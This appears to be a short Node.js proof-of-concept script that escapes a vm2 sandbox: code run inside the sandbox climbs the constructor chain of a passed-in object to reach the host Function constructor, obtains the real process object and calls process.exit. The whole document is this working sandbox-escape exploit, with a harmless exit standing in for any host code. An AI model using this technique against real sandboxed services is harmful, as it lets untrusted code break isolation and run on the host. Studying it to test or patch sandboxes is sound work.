const { VM } = require('vm2');
const sandbox = { someObject: {} };
const vm = new VM({ sandbox });
const code = `
  const ForeignObject = someObject.constructor;
  const ForeignFunction = ForeignObject.constructor;
  const process = ForeignFunction('return process')();
  const console = ForeignFunction('return console')();
  console.log('Exiting process');
  process.exit(0);
`;

console.log('Before executing code');
try {
  vm.run(code, sandbox);
} catch (error) {
  console.error(error);
}
console.log('After executing code');
